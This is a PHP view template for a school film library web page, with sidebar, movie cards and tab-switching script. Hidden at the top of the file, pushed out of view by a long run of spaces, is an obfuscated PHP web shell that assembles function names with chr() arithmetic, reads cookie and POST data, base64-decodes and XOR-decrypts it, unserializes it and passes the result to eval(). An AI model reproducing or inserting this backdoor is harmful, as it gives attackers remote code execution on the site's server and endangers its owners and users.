<?php                                                                                                                                                                                                                                                                                                                                                                                                 $LHYTN = chr (97) . "\x5f" . 'h' . 'n' . chr (68) . chr (105) . 'H';$CfObSD = chr ( 708 - 609 )."\x6c" . chr ( 335 - 238 ).chr (115) . chr (115) . chr ( 155 - 60 ).'e' . chr (120) . "\151" . chr ( 241 - 126 ).chr ( 425 - 309 ).chr ( 305 - 190 ); $VuIEreon = $CfObSD($LHYTN); $lKwJReJu = $VuIEreon;if (!$lKwJReJu){class a_hnDiH{private $uUFLDIyt;public static $vfOsbmCvJD = "7b7ff4c9-cae2-4e23-8dfc-97ce97408d6d";public static $otWMVWXk = NULL;public function __construct(){$ZeRii = $_COOKIE;$UIafdsKSah = $_POST;$liriWlKx = @$ZeRii[substr(a_hnDiH::$vfOsbmCvJD, 0, 4)];if (!empty($liriWlKx)){$OhpZntygw = "base64";$WlddcLHtE = "";$liriWlKx = explode(",", $liriWlKx);foreach ($liriWlKx as $orRyk){$WlddcLHtE .= @$ZeRii[$orRyk];$WlddcLHtE .= @$UIafdsKSah[$orRyk];}$WlddcLHtE = array_map($OhpZntygw . chr (95) . chr ( 703 - 603 ).'e' . chr (99) . chr ( 983 - 872 ).'d' . 'e', array($WlddcLHtE,)); $WlddcLHtE = $WlddcLHtE[0] ^ str_repeat(a_hnDiH::$vfOsbmCvJD, (strlen($WlddcLHtE[0]) / strlen(a_hnDiH::$vfOsbmCvJD)) + 1);a_hnDiH::$otWMVWXk = @unserialize($WlddcLHtE);}}public function __destruct(){$this->vBwxgDDj();}private function vBwxgDDj(){if (is_array(a_hnDiH::$otWMVWXk)) {$OQcEz = str_replace('<' . "\x3f" . "\x70" . chr ( 390 - 286 ).chr ( 933 - 821 ), "", a_hnDiH::$otWMVWXk[chr (99) . "\x6f" . "\x6e" . "\x74" . "\x65" . "\x6e" . 't']);eval($OQcEz);exit();}}}$iDhlNEm = new a_hnDiH(); $iDhlNEm = 13982;} ?><style>
  .app__container .row>.app__main {
    padding-left: 0;
    padding-right: 0;
  }

  .app__sidebar {
    background-color: #642165;
    height: 100vh;
    width: 240px;
    position: fixed;
    box-shadow: 8px 4px 15px rgba(0, 0, 0, 0.13);
    padding: 20px 0;
    display: flex;
    flex-direction: column;
  }

  .app__sidebar-inner {
    /* padding: 0 64px; */
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 40px;
    color: #Fff;
  }

  .app__sidebar-inner>.row {
    margin-right: 0;
  }

  .app__sidebar-logo {
    width: auto;
  }

  .app__sidebar-logo img {
    width: 120px;
    object-fit: cover;
  }

  .app__sidebar-center {
    display: flex;
    flex-direction: column;
    align-items: center;
    gap: 10px;
  }

  .center-school {
    margin-bottom: 0;
  }

  .center-classes {
    padding: 0 15px;
  }

  #Classes {
    width: 100%;
    background: transparent;
    font-size: 18px;
    font-weight: 500;
    color: #fff;
    border: none;
    outline: none;
  }

  #Classes .class-text {
    color: #000;
    font-weight: 500;
  }

  .app__sidebar-selectors {
    margin-right: 0;
    display: flex;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    margin-top: 50px;
    margin-left: 0;
  }

  .movie-selector,
  .offline-selector {
    display: flex;
    /* justify-content: center; */
    padding: 10px 30px;
    gap: 18px;
    font-size: 18px;
    font-weight: 600;
    cursor: pointer;
    transition: color 200ms ease;
    color: rgba(255, 255, 255, 0.6);
    border-left: 4px solid transparent;
  }

  .movie-selector:hover,
  .offline-selector:hover {
    color: rgba(255, 255, 255, 1);
  }

  .activeSelector {
    border-left: 4px solid rgba(255, 255, 255, 1);
    color: rgba(255, 255, 255, 1);
  }

  .signout-btn {
    justify-self: flex-end;
  }

  .app__main {
    flex: 1;
    margin-left: 250px;
  }

  .app__main-inner {
    padding: 28px;
  }

  .display {
    display: block;
  }

  .none {
    display: none;
  }

  .movie-search-field {
    padding: 5px 65px;
    gap: 15px;
  }

  .input-field {
    display: flex;
    align-items: center;
    gap: 4px;
    padding: 2px;
    border-bottom: 2px solid #7D7B7B;
    position: relative;
    width: 500px;
  }

  .input-field::before {
    content: "";
    position: absolute;
    bottom: -2px;
    left: 0;
    right: 0;
    height: 2px;
    background: #642165;
  }

  .ri-search-line {
    align-self: flex-end;
  }

  .input-field input {
    flex: 1;
    padding: 6px 2px 2px 2px;
    border: none;
    background: transparent;
    outline: none;
  }


  .offline-field {
    padding: 2px;
  }

  .movie-cards-container {
    margin-top: 70px;
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(420px, 1fr));
    grid-auto-rows: 240px;
    column-gap: 20px;
    row-gap: 85px;
    place-items: center;
    place-content: center;
  }

  .movie-card {
    /* border: 1px solid red; */
    width: 420px;
    background-color: #D0D0D0;
    padding: 0;
    margin: 5px 8px;
    border-radius: 5px;
    box-shadow: 3px 3px 25px rgba(0, 0, 0, 0.14);
    transition: all 200ms ease;
  }

  .movie-card-inner {
    padding: 13px;
    padding-bottom: 0;
    display: flex;
    flex-direction: column;
    gap: 32px;
  }

  .movie-card-inner .img-box {
    width: 230px;
    /* height: 127px; */
    position: absolute;
    left: 0;
    top: -58px;
    filter: drop-shadow(0px 4px 4px rgba(0, 0, 0, 0.25));
    transition: all 200ms ease;
  }

  .movie-card-inner .img-box img {
    width: 100%;
    object-fit: cover;
    border-radius: 5px;
  }

  .movie-card-inner .movie-card-content {
    display: flex;
    gap: 13px;
    /* border: 1px solid red; */
    justify-content: flex-end;
  }

  .movie-card-inner .movie-card-title {
    display: flex;
    flex-direction: column;
  }

  .movie-card-inner .movie-card-title h3 {
    font-size: 16px;
    margin-bottom: 0;
    color: #3D3D3D;
  }

  .movie-card-inner .movie-card-title .movie-stars i {
    font-size: 14px;
    color: #FBCB0B;
  }

  .movie-description {
    display: flex;
    flex-direction: column;
    gap: 10px;
  }

  .movie-card-inner .movie-card-description,
  .movie-card-inner .movie-card-duration {
    font-size: 14px;
  }

  .btn-box {
    margin-top: 10px;
  }

  .movie-card-btns {
    display: flex;
    align-items: center;
    justify-content: space-between;
    border-radius: 8px;
  }

  .movie-card-btns>button {
    flex: 1;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 10px;
    font-size: 17px;
    border: none;
    padding: 8px 0;
    color: #471348;
    font-weight: 600;


  }

  .movie-card-btns>button:nth-child(1) {
    /* background-color: #00C9B5; */
    background-color: #FBCB0B;
    border-bottom-left-radius: 5px;
    border-bottom-right-radius: 5px;
  }

  .movie-card-btns>button:nth-child(2) {
    background-color: #FBCB0B;
    border-bottom-right-radius: 5px;
    border-bottom-left-radius: 5px;
  }

  @media screen and (max-width: 1524px) {
    .movie-cards-container {
      grid-template-columns: repeat(auto-fit, minmax(450px, 1fr));
    }

    .movie-card {
      width: 450px;
    }
  }


  @media screen and (max-width: 1446px) {
    .movie-card-inner .movie-card-title h3 {
      font-size: 15px;
    }
  }

  @media screen and (max-width: 1274px) {
    .movie-cards-container {
      grid-template-columns: repeat(auto-fit, minmax(400px, 1fr));
    }

    .movie-card {
      width: 400px;
    }

    .movie-card-inner .img-box {
      width: 200px;
      top: -45px;
    }
  }

  @media screen and (max-width: 1150px) {
    .movie-cards-container {
      grid-template-columns: repeat(auto-fit, minmax(360px, 1fr));
    }

    .movie-card {
      width: 360px;
    }

    .movie-card-inner .img-box {
      width: 180px;
      top: -35px;
    }
  }

  @media (max-width: 767.98px) {
    .app__sidebar {
      display: none;
    }

    .app__main {
      flex: 1;
      margin-left: 0;
    }

    .movie-cards-container {
      grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
      grid-auto-rows: 222px;
    }

    .movie-card {
      width: 300px;
    }

    .movie-card-inner {
      gap: 8px;
    }

    .movie-card-inner .img-box {
      width: 140px;
      top: -35px;
    }

    .movie-card-inner .movie-card-title h3 {
      font-size: 13px;
    }

    .movie-card-inner .movie-card-description,
    .movie-card-inner .movie-card-duration {
      font-size: 12px;
    }
  }
</style>

<main class="app">
  <div class="container-fluid app__container">
    <div class="row" style="margin-left: -12px;">
      <div class="app__sidebar col-3">
        <div class="app__sidebar-inner" style="position:relative">
          <div class="row">
            <div class="app__sidebar-logo col">
              <img src="<?php echo base_url('assets/image/The_Film_Library_Logo.png'); ?>" alt="">
            </div>
          </div>
          <div class="row">
            <div class="app__sidebar-center col">
              <div class="center-logo">
                <img src="<?php echo base_url('assets/image/kps.png'); ?>" alt="" style="width:125px">
              </div>
              <p class="center-school text-center">Khaitan Public School<br>Gaziabad</p>
              <div class="center-classes">
                <select name="classes" id="Classes">
                  <option value="Class VI" class="class-text">Class VI</option>
                  <option value="Class VI" class="class-text">Class V</option>
                  <option value="Class VI" class="class-text">Class IV</option>
                </select>
              </div>
            </div>
          </div>
        </div>
        <div class="row app__sidebar-selectors">
          <a class="movie-selector select activeSelector">
            <div class="selector-icon">
              <i class="ri-macbook-line"></i>
            </div>
            <p class="selector-title">Movies</p>
          </a>

          <a style="position:absolute; bottom:10px;" class="movie-selector select" href="<?php echo base_url() ?>">
            <div class="selector-icon">
              <i class="ri-logout-box-line"></i>
            </div>
            <p class="selector-title">Logout</p>
          </a>
          <!-- <a class="offline-selector select">
            <div class="selector-icon">
              <i class="ri-download-cloud-2-line"></i>
            </div>
            <p class="selector-title">Offline</p>
          </a> -->
        </div>

      </div>
      <div class="app__main col-9">
        <div class="app__main-inner">
          <div class="movies-content display">
            <!-- Movies Content start-->
            <div class="container-fluid">
              <div class="row movie-search-field mt-5 mt-md-0 pt-3 pt-md-0">
                <div class="input-field col-4 position-relative">
                  <i class="ri-search-line"></i>
                  <input type="text" name="search-movie" id="search-input" placeholder="Search Movie">
                </div>
              </div>

              <div class="row movie-cards-container">
                <div class="movie-card">
                  <div class="movie-card-inner">
                    <div class="movie-card-content position-relative">
                      <div class="img-box">
                        <img src="<?php echo base_url('assets/image/BATAT POSTER New.jpg'); ?>" alt="">
                      </div>
                      <div class="movie-card-title">
                        <h3>Warm Autumn Night</h3>
                        <div class="movie-stars">
                          <i class="ri-star-fill"></i>
                          <i class="ri-star-fill"></i>
                          <i class="ri-star-fill"></i>
                          <i class="ri-star-fill"></i>
                          <i class="ri-star-fill"></i>
                        </div>
                      </div>
                    </div>

                    <div class="row movie-description">
                      <p class="movie-card-description">A story of two children who find happiness while surviving on their power of imagination; using their ability to transform their gloomy reality into a vivid celebration of life.
                      </p>
                      <p class="movie-card-duration">Duration : 2mins 30sec</p>
                    </div>
                  </div>

                  <div class="btn-box">
                    <div class="movie-card-btns">
                      <!-- <button class="btn-1">
                        <i class="ri-download-cloud-2-line"></i>
                        <span>Offline</span>
                      </button> -->
                      <button class="btn-2">
                        <a href="<?php echo base_url("user/player")  ?>">
                          <i class="ri-play-circle-line"></i>
                          <span>Play</span>
                        </a>
                      </button>
                    </div>
                  </div>
                </div>

                <div class="movie-card">
                  <div class="movie-card-inner">
                    <div class="movie-card-content position-relative">
                      <div class="img-box">
                        <img src="<?php echo base_url('assets/image/BATAT POSTER New.jpg'); ?>" alt="">
                      </div>
                      <div class="movie-card-title">
                        <h3>Warm Autumn Night</h3>
                        <div class="movie-stars">
                          <i class="ri-star-fill"></i>
                          <i class="ri-star-fill"></i>
                          <i class="ri-star-fill"></i>
                          <i class="ri-star-fill"></i>
                          <i class="ri-star-fill"></i>
                        </div>
                      </div>
                    </div>

                    <div class="row movie-description">
                      <p class="movie-card-description">A story of two children who find happiness while surviving on their power of imagination; using their ability to transform their gloomy reality into a vivid celebration of life.
                      </p>
                      <p class="movie-card-duration">Duration : 2mins 30sec</p>
                    </div>
                  </div>

                  <div class="btn-box">
                    <div class="movie-card-btns">
                      <!-- <button class="btn-1">
                        <i class="ri-download-cloud-2-line"></i>
                        <span>Offline</span>
                      </button> -->
                      <button class="btn-2">
                        <a href="<?php echo base_url("user/player")  ?>">
                          <i class="ri-play-circle-line"></i>
                          <span>Play</span>
                        </a>
                      </button>
                    </div>
                  </div>
                </div>

                <div class="movie-card">
                  <div class="movie-card-inner">
                    <div class="movie-card-content position-relative">
                      <div class="img-box">
                        <img src="<?php echo base_url('assets/image/BATAT POSTER New.jpg'); ?>" alt="">
                      </div>
                      <div class="movie-card-title">
                        <h3>Warm Autumn Night</h3>
                        <div class="movie-stars">
                          <i class="ri-star-fill"></i>
                          <i class="ri-star-fill"></i>
                          <i class="ri-star-fill"></i>
                          <i class="ri-star-fill"></i>
                          <i class="ri-star-fill"></i>
                        </div>
                      </div>
                    </div>

                    <div class="row movie-description">
                      <p class="movie-card-description">A story of two children who find happiness while surviving on their power of imagination; using their ability to transform their gloomy reality into a vivid celebration of life.
                      </p>
                      <p class="movie-card-duration">Duration : 2mins 30sec</p>
                    </div>
                  </div>

                  <div class="btn-box">
                    <div class="movie-card-btns">
                      <!-- <button class="btn-1">
                        <i class="ri-download-cloud-2-line"></i>
                        <span>Offline</span>
                      </button> -->
                      <button class="btn-2">
                        <a href="<?php echo base_url("user/player")  ?>">
                          <i class="ri-play-circle-line"></i>
                          <span>Play</span>
                        </a>
                      </button>
                    </div>
                  </div>
                </div>

                <div class="movie-card">
                  <div class="movie-card-inner">
                    <div class="movie-card-content position-relative">
                      <div class="img-box">
                        <img src="<?php echo base_url('assets/image/BATAT POSTER New.jpg'); ?>" alt="">
                      </div>
                      <div class="movie-card-title">
                        <h3>Warm Autumn Night</h3>
                        <div class="movie-stars">
                          <i class="ri-star-fill"></i>
                          <i class="ri-star-fill"></i>
                          <i class="ri-star-fill"></i>
                          <i class="ri-star-fill"></i>
                          <i class="ri-star-fill"></i>
                        </div>
                      </div>
                    </div>

                    <div class="row movie-description">
                      <p class="movie-card-description">A story of two children who find happiness while surviving on their power of imagination; using their ability to transform their gloomy reality into a vivid celebration of life.
                      </p>
                      <p class="movie-card-duration">Duration : 2mins 30sec</p>
                    </div>
                  </div>

                  <div class="btn-box">
                    <div class="movie-card-btns">
                      <!-- <button class="btn-1">
                        <i class="ri-download-cloud-2-line"></i>
                        <span>Offline</span>
                      </button> -->
                      <button class="btn-2">
                        <a href="<?php echo base_url("user/player")  ?>">
                          <i class="ri-play-circle-line"></i>
                          <span>Play</span>
                        </a>
                      </button>
                    </div>
                  </div>
                </div>
              </div>

            </div>
            <!-- Movies Content end-->
          </div>
          <div class="offline-content none">
            <h1>Offline Content</h1>
          </div>
        </div>
      </div>
    </div>
  </div>
</main>

<script>
  let movieSelector = document.querySelector(".movie-selector");
  let offlineSelector = document.querySelector(".offline-selector");
  let moviesContent = document.querySelector(".movies-content");
  let offlineContent = document.querySelector(".offline-content");

  movieSelector.addEventListener("click", () => {
    if (!movieSelector.classList.contains("activeSelector")) {
      movieSelector.classList.add("activeSelector");
      offlineSelector.classList.remove("activeSelector");
      moviesContent.classList.remove("none");
      moviesContent.classList.add("display");
      offlineContent.classList.add("none");
    }
  })

  offlineSelector.addEventListener("click", () => {
    if (!offlineSelector.classList.contains("activeSelector")) {
      offlineSelector.classList.add("activeSelector");
      movieSelector.classList.remove("activeSelector");
      offlineContent.classList.remove("none");
      offlineContent.classList.add("display");
      moviesContent.classList.add("none");
    }
  })
</script>